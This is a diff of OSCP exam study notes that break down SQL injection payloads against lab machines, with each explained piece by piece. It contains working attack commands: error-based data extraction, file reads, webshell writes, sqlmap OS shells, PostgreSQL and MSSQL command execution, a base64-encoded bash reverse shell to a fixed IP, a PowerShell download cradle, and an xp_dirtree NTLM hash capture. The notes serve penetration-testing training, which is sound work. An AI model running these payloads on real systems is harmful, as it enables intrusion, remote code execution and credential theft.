@@ -9,7 +9,7 @@ Full teardowns of the SQLi payloads used across [[10. SQL Injection Attacks|SQL 
 
 **Full command:**
 ```bash
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers')))-- -" http://192.168.156.48/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='subscribers')))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 ```
 
 **Piece by piece:**
@@ -93,7 +93,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,(SELECT g
 
 **Full command:**
 ```bash
-curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/var/www/flag.txt')),1,31)))-- -" http://192.168.156.48/index.php | grep -i "XPATH"
+curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring((SELECT LOAD_FILE('/var/www/flag.txt')),1,31)))-- -" http://$BoxIP/index.php | grep -i "XPATH"
 ```
 
 **Piece by piece:** everything up to the innermost subquery works exactly like the [[SQL Injection (Breakdowns)#Error-based extraction via extractvalue() on a POST field|main extractvalue() entry]] above, this is that same exfiltration channel repurposed to leak file contents instead of table data.
@@ -125,7 +125,7 @@ curl -s -X POST --data "mail-list=test' AND extractvalue(1,concat(0x7e,substring
 
 **Where this comes from:** HackTricks' "MySQL File Priv to SSRF/RCE" section documents `INTO OUTFILE` as the standard privilege-permitting write primitive for MySQL, with the same `FILE` privilege + writable-directory prerequisites as `LOAD_FILE()` above (it's the write-side counterpart). PayloadsAllTheThings has ready PHP one-liner webshell strings if you want something more capable than a bare `system()` call.
 
-**Where to look in the response:** the app's own HTTP response will look like a failure (a type-mismatch error page), that's expected and not a signal either way. The real confirmation is a separate request straight to the file you wrote, e.g. `curl "http://<target>/tmp/webshell.php?cmd=id"`, treat the UNION request and the confirmation request as two independent checks.
+**Where to look in the response:** the app's own HTTP response will look like a failure (a type-mismatch error page), that's expected and not a signal either way. The real confirmation is a separate request straight to the file you wrote, e.g. `curl "http://$BoxIP/tmp/webshell.php?cmd=id"`, treat the UNION request and the confirmation request as two independent checks.
 
 🔁 **Seen in:** [[10. SQL Injection Attacks#10.3.1. Manual Code Execution|SQL Injection Attacks, 10.3.1]] (MySQL section), and its companion [[SQL Injection & Databases|Command Appendix's SQL Injection Payloads]] entry.
 
@@ -164,7 +164,7 @@ EXECUTE xp_cmdshell 'whoami';
 
 **Full commands:**
 ```bash
-sqlmap -u "http://192.168.245.19/search.php" --data="item=test" -p item --batch --technique=T -T users --dump
+sqlmap -u "http://$BoxIP/search.php" --data="item=test" -p item --batch --technique=T -T users --dump
 sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 ```
 
@@ -188,7 +188,7 @@ sqlmap -r post.txt -p item --os-shell --web-root "/var/www/html/tmp"
 
 **Full command:**
 ```bash
-curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT version()) AS int),NULL,NULL,NULL,NULL-- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php | grep -iE "warning|error"
+curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT version()) AS int),NULL,NULL,NULL,NULL-- &age=25&gender=Male&email=test@test.com" http://$BoxIP/class.php | grep -iE "warning|error"
 ```
 
 **Piece by piece:**
@@ -212,9 +212,9 @@ curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT vers
 
 **Full commands:**
 ```bash
-curl -s -X POST --data "weight=70&height=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php
+curl -s -X POST --data "weight=70&height=x'; CREATE TABLE IF NOT EXISTS cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; -- &age=25&gender=Male&email=test@test.com" http://$BoxIP/class.php
 
-curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output, ' | ')) AS int),NULL,NULL,NULL,NULL FROM cmd_exec-- &age=25&gender=Male&email=test@test.com" http://192.168.170.49/class.php | grep -iE "warning|error"
+curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT string_agg(cmd_output, ' | ')) AS int),NULL,NULL,NULL,NULL FROM cmd_exec-- &age=25&gender=Male&email=test@test.com" http://$BoxIP/class.php | grep -iE "warning|error"
 ```
 
 **Piece by piece:**
@@ -238,11 +238,11 @@ curl -s -X POST --data "weight=70&height=x%' UNION SELECT NULL,CAST((SELECT stri
 
 **Full command (the broken version):**
 ```bash
-curl -X POST --data "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://<target>/class.php
+curl -X POST --data "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://$BoxIP/class.php
 ```
 **Fixed version:**
 ```bash
-curl -X POST --data-urlencode "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://<target>/class.php
+curl -X POST --data-urlencode "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjIxMi80NDQ0IDA+JjEgJiI= | base64 -d | bash'; -- " http://$BoxIP/class.php
 ```
 
 **Piece by piece:**
@@ -265,13 +265,13 @@ curl -X POST --data-urlencode "height=x'; COPY cmd_exec FROM PROGRAM 'echo YmFza
 **The diagnostic commands (not a payload to copy, a troubleshooting sequence):**
 ```bash
 # 1. Prove the query executes at all, via a measurable side effect (timing), not error text
-offsec'; WAITFOR DELAY '0:0:5'-- 
+offsec'; WAITFOR DELAY '0:0:5'--
 
 # 2. Try to read data back via a stacked statement's error (this silently fails)
-offsec'; DECLARE @out TABLE(line varchar(8000)); INSERT INTO @out EXEC xp_cmdshell 'whoami'; SELECT CONVERT(int,(SELECT TOP 1 line FROM @out))-- 
+offsec'; DECLARE @out TABLE(line varchar(8000)); INSERT INTO @out EXEC xp_cmdshell 'whoami'; SELECT CONVERT(int,(SELECT TOP 1 line FROM @out))--
 
 # 3. Rule out "my command was wrong" with a guaranteed, unconditional error
-offsec'; SELECT 1/0-- 
+offsec'; SELECT 1/0--
 ```
 
 **Piece by piece:**
@@ -294,13 +294,13 @@ offsec'; SELECT 1/0--
 
 **Full command (the T-SQL fragment sent as the injected username):**
 ```sql
-'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://<ip>/shell.ps1'')"'-- 
+'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://$BoxIP/shell.ps1'')"'--
 ```
 
 **Piece by piece, working from the inside out (three separate languages, three separate quoting rules, all nested in one string):**
-- Innermost: `New-Object Net.WebClient).DownloadString('http://<ip>/shell.ps1')` → plain PowerShell, a **download cradle**, fetch a script's text over HTTP and hand it to `IEX` (`Invoke-Expression`) to execute it in memory, no file ever touches disk. PowerShell string literals use single quotes here.
+- Innermost: `New-Object Net.WebClient).DownloadString('http://$BoxIP/shell.ps1')` → plain PowerShell, a **download cradle**, fetch a script's text over HTTP and hand it to `IEX` (`Invoke-Expression`) to execute it in memory, no file ever touches disk. PowerShell string literals use single quotes here.
 - Middle layer: `powershell -c "IEX(...)..."` → this whole PowerShell command needs to be passed as **one argument** to `cmd.exe` (which is what `xp_cmdshell` actually invokes under the hood). `cmd.exe` uses **double quotes**, not single quotes, to group an argument containing spaces, so the entire PowerShell command gets wrapped in `"..."` for `cmd.exe`'s sake. This is why the string now has both single quotes (PowerShell's) and double quotes (cmd.exe's) *coexisting*, they belong to two different parsers reading the same characters at two different stages.
-- Outermost: `EXEC xp_cmdshell '...'` → the whole `powershell -c "..."` string is itself a **T-SQL string literal**, delimited by single quotes, being passed as `xp_cmdshell`'s one argument. T-SQL's escaping rule for a literal single quote *inside* a single-quoted string is to **double it** (`''`), not backslash-escape it, that's why the PowerShell URL's surrounding quotes appear as `''http://<ip>/shell.ps1''` instead of `\'...\'`, each `''` is T-SQL's way of saying "one literal `'` character here, not the end of the string."
+- Outermost: `EXEC xp_cmdshell '...'` → the whole `powershell -c "..."` string is itself a **T-SQL string literal**, delimited by single quotes, being passed as `xp_cmdshell`'s one argument. T-SQL's escaping rule for a literal single quote *inside* a single-quoted string is to **double it** (`''`), not backslash-escape it, that's why the PowerShell URL's surrounding quotes appear as `''http://$BoxIP/shell.ps1''` instead of `\'...\'`, each `''` is T-SQL's way of saying "one literal `'` character here, not the end of the string."
 - Why the double quotes (cmd.exe's) never needed escaping for T-SQL → because T-SQL's string delimiter is the single quote, not the double quote, so a `"` character inside a T-SQL string is just an ordinary character to the parser, no special handling needed at that layer.
 - One more layer in practice, not shown above: since this entire T-SQL fragment is itself the value of an HTTP form field being sent via `curl --data-urlencode`, it also has to survive being embedded inside a **bash double-quoted string** on the attacking machine, meaning the literal `"` characters (cmd.exe's) need a bash backslash-escape (`\"`) so bash doesn't treat them as ending its own string early. Four layers of quoting rules, stacked, each one only caring about its own delimiter character.
 
@@ -320,7 +320,7 @@ offsec'; SELECT 1/0--
 
 **Full command:**
 ```sql
-EXECUTE master..xp_dirtree '\\192.168.45.200\share', 1, 1;
+EXECUTE master..xp_dirtree '\\$BoxIP\share', 1, 1;
 ```
 Listener on Kali:
 ```bash
@@ -329,7 +329,7 @@ sudo impacket-smbserver -smb2support share /tmp/share
 
 **Piece by piece:**
 - `xp_dirtree` → an extended stored procedure that reads a directory tree and returns file/folder names. Extended procs run as native code inside MSSQL's process space, so they can do anything the MSSQL service account can do, including making outbound network connections.
-- `'\\192.168.45.200\share'` → a UNC path pointing at the attacker's machine. When MSSQL resolves a UNC path, it initiates an **SMB connection** to the specified host to enumerate the share.
+- `'\\$BoxIP\share'` → a UNC path pointing at the attacker's machine. When MSSQL resolves a UNC path, it initiates an **SMB connection** to the specified host to enumerate the share.
 - **Windows NTLM authentication is automatic.** The OS sends the MSSQL service account's Net-NTLMv2 hash as part of the SMB handshake, without prompting anyone. The attacker's SMB server (impacket-smbserver) is configured to capture and log that hash.
 - `, 1, 1` → depth=1 (recurse 1 level), include files=1. The exact values don't matter for the hash capture, the connection and auth happen before the directory listing even starts.
 
@@ -385,3 +385,14 @@ EXECUTE ('EXECUTE (''EXECUTE (''''xp_cmdshell ''''''''whoami'''''''''''') AT [IN
 - [RevShells](https://www.revshells.com/) for payload troubleshooting
 - [CyberChef](https://gchq.github.io/CyberChef/) for encoding and decoding
 - [ippsec.rocks](https://ippsec.rocks/) for walkthrough searches
+## Why this matters for OSCP
+
+This page turns one repeatable part of an authorized assessment into a checklist you can apply under exam time pressure.
+
+## Related Modules
+
+- [[MODULES/10. SQL Injection Attacks]] -- module concepts used by this hub page
+
+## Demonstrated in box write-ups
+
+- [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- demonstrates the workflow described here
